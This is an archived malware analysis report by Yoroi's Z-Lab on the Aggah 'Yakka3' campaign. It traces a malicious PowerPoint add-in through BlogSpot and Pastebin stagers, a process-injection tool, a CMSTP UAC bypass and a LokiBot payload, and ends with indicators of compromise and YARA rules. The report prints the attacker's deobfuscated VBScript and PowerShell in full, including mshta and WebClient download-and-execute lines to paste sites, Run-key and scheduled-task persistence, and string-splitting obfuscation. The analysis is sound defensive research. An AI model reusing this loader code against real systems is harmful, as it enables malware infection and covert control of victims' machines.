{
    "id": "e5856172-15ce-4b3f-a43d-53ec152329c5",
    "created_at": "2023-01-12T15:04:25.685479Z",
    "updated_at": "2025-03-27T02:12:13.879797Z",
    "deleted_at": null,
    "sha1_hash": "5c527016c0b5f5d6c64d6eb15e26b766636df878",
    "title": "2020-01-27 - Aggah- How to run a botnet without renting a Server (for more than a year)",
    "authors": "",
    "file_creation_date": "2022-05-28T15:43:28Z",
    "file_modification_date": "2022-05-28T15:43:28Z",
    "file_size": 339622,
    "plain_text": "# Aggah: How to run a botnet without renting a Server (for more than a year)\n\n**[yoroi.company/research/aggah-how-to-run-a-botnet-without-renting-a-server-for-more-than-a-year/](https://yoroi.company/research/aggah-how-to-run-a-botnet-without-renting-a-server-for-more-than-a-year/)**\n\nJanuary 27, 2020\n\n01/27/2020\n\n## Introduction\n\n[During the last year, we constantly kept track of the Aggah campaigns. We started deepening inside the Roma225 Campaign](https://blog.yoroi.company/research/the-enigmatic-roma225-campaign/)\n[and went on with the RG Campaign, contributing to the joint effort to track the offensive activities of this threat actor.](https://blog.yoroi.company/research/the-evolution-of-aggah-from-roma225-to-the-rg-campaign/)\n\nRecently, during our Cyber Defence monitoring operations, we spotted other attack attempts directed to some Italian companies\noperating in the Retail sector. For this reason, the Cybaze-Yoroi ZLab team decided to dissect this last Aggah campaign and\ntrack its latest variations.\n\n## Technical Analysis\n\nHash 77bbd615bc5b34ce007a82a7f365426fc1091ed7eeca3b3888d35b8242288184\n\nThreat Yakka3 Campaign\n\n\nBrief\nDescription\n\n\nMalicious ppa file dropper with macro\n\n\nSsdeep 1536:LEFGlBGHLAegbRrnDKSeJ8SuXCak5w/PYvwgqTtCxqTyU2wCNkY:LplBKLAegbRrnDKSeJ8SuXXk5ALgqd2\n\nTable 1. Sample information\n\nThe initial file is a Microsoft PowerPoint PPA file. It actually is an Add-in file designed to add new behavior to the classic\nPowerPoint presentations, in this case to add a nasty macro:\n\nFigure 1: Piece of the malicious macro\nThe malicious code within the PPA abuses the Microsoft mshta utility to download a web page from the BlogSpot platform.\n\nFigure 2: Result of the Bit.ly link\n\n\n-----\n\nThe HTML page closely matches the modus operandi of the previous Aggah threat. In this case, the blogspot post is named\n“20sydney new” but it uses the same trick from the past: hiding the javascript stager code inside the web page, an ad hoc code\nsnippet which will be interpreted and executed only by the mshta engine.\n\nFigure 3: Malicious code hidden in the Blogspot web page and executed by the MSHTA engine\nThe parameter passed the “unescape()” function results in another two layers of encoded strings, adopting a sort of “matrioska\nunecape obfuscation”. After these layers, we recovered the malicious logic of the stager:\n```\n<script language=\"VBScript\">\nSet M_c = CreateObject(StrReverse(\"llehS.tpircSW\"))\nDim L_c\nL_c = StrReverse(\"exe.drowniw mi/ f/ llikksat & exe.lecxe mi/ f/ llikksat c/ dmc\")\nM_c.Run L_c, vbHide\nset Ixsi = CreateObject(StrReverse(\"llehS.tpircSW\"))\nDim Bik\nBik1 = \"mshta http:\\\\pastebin.com\\raw\\JELH48mw\"\nIxsi.run Bik1, vbHide\nset nci = CreateObject(StrReverse(\"llehS.tpircSW\"))\nDim xx\nxx1 = \"r \"\"mshta http:\\\\pastebin.com\\raw\\JELH48mw\"\" /F \"\nxx0 = StrReverse(\"t/ )+niam+( nt/ 06 om/ ETUNIM cs/ etaerc/ sksathcs\")\nnci.run xx0 + xx1, vbHide\nSet ll = CreateObject(StrReverse(\"llehS.tpircSW\"))\nno = StrReverse(\"mmetsaP\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\UCKH\")\nll.RegWrite no,\"mshta http:\\\\pastebin.com\\raw\\NxJCPTmQ\",\"REG_SZ\"\nself.close\n</script>\n\n```\nCode Snippet 1\n\nThe first part of this initial implant aims to kill the Word and Excel processes. Immediately after that, the malware downloads\nother code through leveraging mshta once again, this time from a pastebin snippet.\n\nFigure 4: Piece of the malicious Pastebin\nThe author of this pastes is no more “HAGGA”, as seen in our previous analysis, now the he moved to another one: “YAKKA3”:\n\nFigure 5: Evidence of YAKKA3 Pastebin user\nThe paste was created on the 25th November 2019 and it has likely been edited many times in the course the last month. In the\npast Aggah was frequently changing the content of his pastes to modify the malware behaviour and drop many kinds of\nmalware. On some occasions, some of them suspected to be related to the Gorgon APT group. Anyway, during the analysis,\nthe content of the encoded string is the following:\n```\n<script language=\"VBScript\">\nSet MVn = CreateObject(StrReverse(\"llehS.tpircSW\"))\nMcn = \"powershell do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);[void]\n[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');$fj=\n[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),'Dow$_$loadStri$_$g'.replace('$_$','n'),\n[Microsoft.VisualBasic.CallType]::Method,'https://paste.ee/r/Zhs3s')|IEX;[Byte[]]$f=\n[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),'Dow$_$loadStri$_$g'.replace('$_$','n'),\n[Microsoft.VisualBasic.CallType]::Method,'https://paste.ee/r/Fk9yH').replace('*','0x')|IEX;\n[vroombrooomkrooom]::kekedoyouloveme('calc.exe',$f)\"\nMVn.Run Mcn, vbHide\nself.close\n</script>\n\n```\nCode Snippet 2\n\nThe above script is a piece of VBS script designed to run some other Powershell loader. The powershell script tests the internet\nconnectivity by pinging to google.com and then starts the infection. The script downloads two other pastes. The first is a PE file\nand the second one is a custom .NET process injection utility.\n\n\n-----\n\n### The Injector\n\nHash b8f6cad3723d1dd2219d02f930e5cda776c124387f19f3decd867495ce614eb7\n\nThreat Yakka3 Campaign\n\n\nBrief\nDescription\n\n\nInjector through process hollowing\n\n\nSsdeep 384:0UUX1vfjRPJok0e9i3h3i91/EPK59732wag7lRa3oNU1XURDlK67qfM9Wi:0X1qH3hBPU3B7K4NUJCDCfM\n\nTable 2. Sample information of the injector\n\nThe injector component is invoked through its static method “[vroombrooomkrooom]::kekedoyouloveme('calc.exe',$f)”, as seen\nin the code snippet 2. The only purpose of this component is to inject a payload inside the memory of another one process, as\nindicated in the parameter.\n\nFigure 6: Write Process Memory technique\nThe injection technique is very basic. In fact the injection uses the textbook “CreateRemoteThread” technique, well documented\nand used actively implemented by many actors and malware developers.\n\nFigure 7: Injected payload inside calc.exe process\n\n### UAC Bypass Tool\n\nIn Code Snippet 1 we saw that the aggah implant persists on the target machine by setting the “mshta http:\n\n[\\\\pastebin.]com\\raw\\NxJCPTmQ” command into the Registry Key\n“HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Pastemm”, so, it potentially loads different payloads on every run.\n\nFigure 8: Piece of the malicious script executed by the persistence mechanism\n\nUnlike previous pastes, the author of this one is YAKKA4. Probably, a form of redundancy in case of take down of the other\naccounts.\n\nFigure 9: YAKKA4 evidence\n\nAnyway, the code served by this paste downloads another binary file from an additional Paste site: paste.ee.\n```\n<script language=\"VBScript\">\nSet i9i9 = CreateObject(\"W\" + \"S\" + \"c\" + \"r\" + \"i\" + \"p\" + \"t\" + \".\" + \"S\" + \"h\" + \"e\" + \"l\" + \"l\")\ni9i9.Run(\"P\" + \"o\" + \"w\" + \"e\" + \"r\" + \"s\" + \"h\" + \"e\" + \"l\" + \"l\" + \".\" + \"e\" + \"x\" + \"e -noexit [Byte[]]$sc64=\niex(iex('(&\" + \"(GCM *W-O*)'+ 'Net.'+\" + \"'WebC'+'l\" + \"ient)'+'.Do\" + \"w'+'nload'+'Str'+'ing(''https://p\" +\n\"aste.ee/r/6EdQX'').repl\" + \"ace(''*^*'',''^%$'').r\" + \"e\" + \"p\" + \"l\" + \"a\" + \"c\" + \"e\" + \"(''^%$'',''0x'')'));[<##>\"\n+ \"Ap\" + \"pDomain<##>]::<##>('(\" + \"&[email protected]#$%^&*(urrent\" + \"Domain'.rep\" + \"lace('(&\n[email protected]#$%^&*(','C'))<##>.<##>('%\" + \"*&^*&^*&^*&^*&oad'.r\" + \"eplace('%\" + \"*&^*&^*&^\" + \"*&^*&\" + \"','L'))\n(\" + \"$sc64).'EntryP\" + \"oint'<##>.<##>('in*&^*\" + \"&^*&^&*^*&^o\" + \"k))*()*)(**(&(*&'.r\" + \"e\" + \"p\" + \"l\" + \"a\" +\n\"c\" + \"e\" + \"('))*()*)(**\" + \"(&(*&','e').r\" + \"e\" + \"p\" + \"l\" + \"a\" + \"c\" + \"e\" + \"('*&^\" + \"*&^*&^&*^*&^','v'))\n($null,$null)\"),0\nself.close\n</script>\n\n```\nCode Snippet 3\n\n[This last binary actually is a hacking tool implementing the CMSTP Bypass technique, a technique used to bypass Windows](https://attack.mitre.org/techniques/T1191/)\nUAC prompts.\n\nAccording to the Microsoft [Documentation, “Connection Manager is a suite of components that provides administrators with the](https://docs.microsoft.com/it-it/previous-versions/windows/it-pro/windows-server-2003/cc786431(v=ws.10))\nability to create and distribute customized remote access connections and to create, distribute, and automatically update\ncustomized phone books.”.\n\nHowever, the cyber attackers could exploit an infected INF file to execute arbitrary commands bypassing the UAC, elevating\nprivileges in a stealthy way. In this case the CMSTP Bypass technique implemented into a .NET executable.\n\nFigure 10: Synthesis of the CMSTP Bypass technique\n\n\n-----\n\n### The Payload\n\nAs we saw in the past, Aggah used to change its payloads during time, and this time we observed that the delivered malware\nwas not RevengeRAT. It rather was a LokiBot variant. This info stealer is [well-known in the community since 2016 and it was](https://www.sans.org/reading-room/whitepapers/malicious/paper/37850)\ndeeply analyzed in the course of the years.\n\nIn this case, it has the following configuration:\n\nFigure 11: Loki Bot configuration with communication to the C2\n\n**The December Payloads**\n\nAs anticipated before, Aggah payloads are quite dynamic. According to the some observation of community researches such as\n[@DrStache, the Aggah pastebin accounts were dropping AZOrult infostealer few days before the Lokibot observation.](https://twitter.com/DrStache_)\n\n[Investigating the c2 infrastructure through the Azorult-Tracker services, we noticed the AZOrult malware distributed by Aggah in](https://azorult-tracker.net/about)\nthat period was targeting a modest number of victims mainly located in the United States, United Arab Emirates and also\nPakistan, Germany and Israel.\n\n## Conclusions\n\nThe Aggah actor keeps threatening organizations all around the world. During the time it built a custom stager implant based on\nlegit third parties services, such as Pastebin and BlogSpot, abused by the actor to manage the infected hosts and to run its\nbotnet without renting a server.\n\nDuring the last year we contributed to the joint effort to track its activities, along with PaloAlto’s [Unit42, and after a year we can](https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/)\nconfirm it is still active and dangerous. At the moment it is not clear if this actor is just selling its hacking services or running its\nown campaigns, or both.\n\nIn conclusion, there is no hard evidence confirming or denying its potential relationships with the Gorgon APT, and factors like\nthe different nationalities and the small amount of victims connected to December Aggah activities, does not help to exclude it.\n\n## Indicators of Compromise\n\n\n-----\n\nHashes\n\nb8f6cad3723d1dd2219d02f930e5cda776c124387f19f3decd867495ce614eb7\n77bbd615bc5b34ce007a82a7f365426fc1091ed7eeca3b3888d35b8242288184\nd0b5b98de820272474d86f1d8bfb9feef08eff95ea0f2968a13ab97ab1ab5b09\n5081ca4672184aaa9e4afa22aec015b79038fcca7d7f8c0650727c541c3d884b\nc76ad03fbc8f465dc0db25fe3fe127f8124623f52693120d54087090acc2ef3e\ndc4a0f6a8ca0192b99a909ec577d2146c891cfdfb28afaa3a2dd6f6d25344cb7\nfd95e72fe145f78a013dc1fbf4fe626d7801de50021f036556d32eec6a116e87\n33beb97e701f4d4fac36dc11bbe3eb5fc372a232586bcea3df1d7903dfe69f25\n0a6c875978b37eaed5af710e584c55c01f07ee01070486980152d63300650aab\nb8f6cad3723d1dd2219d02f930e5cda776c124387f19f3decd867495ce614eb7\n\nPersistence\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Pastemm\n\nC2\n\nhttp[://107.175.150[.73/~giftioz/.cttr/fre.php\n\n### Yara Rules\n\n\n-----\n\n```\n         p g {\n     meta:\n     description = \"Yara Rule for Yakka3 campaign macro PPA document\"\n     author = \"Cybaze Zlab_Yoroi\"\n     last_updated = \"2020-01-23\"\n     tlp = \"white\"\n     category = \"informational\"\n     strings:\n     $a1 = { 1A 88 63 8D A9 78 43 FF }\n     $a2 = { 0D 1B 43 00 1B 44 00 FB 30 1C 33 }\n     $s1 = \"Shell\" \n  condition:\n     all of them\n}\nrule YAKKA3_Campaign_Jan_20_Injector_Module {\n     meta:\n     description = \"Yara Rule for Yakka3 campaign Injector module\"\n     author = \"Cybaze Zlab_Yoroi\"\n     last_updated = \"2020-01-23\"\n     tlp = \"white\"\n     category = \"informational\"\n     strings:\n     $s1 = \"vroombrooomkrooom\" \n     $s2 = \"kekedoyouloveme\" \n     $s3 = \"WriteProcessMemory\"\n     $a1 = { 00 ED 08 8C 05 31 00 ED 08 43 }\n  condition:\n     uint16(0) == 0x5A4D and all of them\n}\nrule YAKKA3_Campaign_Jan_20_CMSTP_Bypass {\n     meta:\n     description = \"Yara Rule for Yakka3 campaign CMSTP Bypass\"\n     author = \"Cybaze Zlab_Yoroi\"\n     last_updated = \"2020-01-23\"\n     tlp = \"white\"\n     category = \"informational\"\n     strings:\n     $s1 = \"cmstp.exe\" ascii wide\n     $s2 = \"CurrentVersion\" ascii wide \n     $s3 = \"INF\" ascii wide\n     $a1 = { 0A 06 8E 69 2D 06 7E 18 }\n  condition:\n     uint16(0) == 0x5A4D and all of them\n}\nrule YAKKA3_Campaign_Jan_20_LokiBOT_Payload {\n     meta:\n     description = \"Yara Rule for Yakka3 campaign Loki bot Payload\"\n     author = \"Cybaze Zlab_Yoroi\"\n     last_updated = \"2020-01-23\"\n     tlp = \"white\"\n     category = \"informational\"\n     strings:\n     $s1 = \"Fuckav.ru\" ascii wide\n     $s2 = \"SOFTWARE\" wide \n  condition:\n     uint16(0) == 0x5A4D and $s1 and #s2 > 10\n}\n\n```\n_This blog post was authored by Luigi Martire and Luca Mella of Cybaze-Yoroi Z-LAB_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-27 - Aggah- How to run a botnet without renting a Server (for more than a year).pdf"
    ],
    "report_names": [
        "2020-01-27 - Aggah- How to run a botnet without renting a Server (for more than a year).pdf"
    ],
    "threat_actors": [
        {
            "id": "28851008-77b4-47eb-abcd-1bb5b3f19fc2",
            "created_at": "2023-06-20T02:02:10.254614Z",
            "updated_at": "2025-03-27T02:00:03.130853Z",
            "deleted_at": null,
            "main_name": "Hagga",
            "aliases": [
                "TH-157",
                "Aggah"
            ],
            "source_name": "MISPGALAXY:Hagga",
            "tools": [
                "Agent Tesla"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b0d34dd6-ee90-483b-bb6c-441332274160",
            "created_at": "2022-10-25T16:07:23.296754Z",
            "updated_at": "2025-03-27T02:02:09.724313Z",
            "deleted_at": null,
            "main_name": "Aggah",
            "aliases": [
                "Operation Red Deer",
                "Operation Roma225"
            ],
            "source_name": "ETDA:Aggah",
            "tools": [
                "AgenTesla",
                "Agent Tesla",
                "AgentTesla",
                "Aggah",
                "Atros2.CKPN",
                "Bladabindi",
                "Jorik",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "Negasteal",
                "Origin Logger",
                "Revenge RAT",
                "RevengeRAT",
                "Revetrat",
                "Warzone",
                "Warzone RAT",
                "ZPAQ",
                "Zurten",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535865,
    "ts_updated_at": 1743041533,
    "ts_creation_date": 1653752608,
    "ts_modification_date": 1653752608,
    "files": {
        "pdf": "https://archive.orkl.eu/5c527016c0b5f5d6c64d6eb15e26b766636df878.pdf",
        "text": "https://archive.orkl.eu/5c527016c0b5f5d6c64d6eb15e26b766636df878.txt",
        "img": "https://archive.orkl.eu/5c527016c0b5f5d6c64d6eb15e26b766636df878.jpg"
    }
}